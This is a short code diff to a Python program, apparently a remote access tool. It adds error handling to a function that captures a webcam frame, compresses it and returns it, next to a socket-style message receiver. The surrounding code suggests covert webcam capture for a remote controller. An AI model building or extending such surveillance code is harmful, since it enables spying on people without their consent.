@@ -666,13 +666,16 @@ while 1:
 
 
             def webcam_shot():
-                cam = vidcap.new_Dev(0, 0)
-                buff, width, height = cam.getbuffer()
-                return str({
-                    'webcambits': zlib.compress(buff),
-                    'width': width,
-                    'height': height,
-                })
+                try:
+                    cam = vidcap.new_Dev(0, 0)
+                    buff, width, height = cam.getbuffer()
+                    return str({
+                        'webcambits': zlib.compress(buff),
+                        'width': width,
+                        'height': height,
+                    })
+                except:
+                    return
 
 
             def data_receive(end='[ENDOFMESSAGE]'):
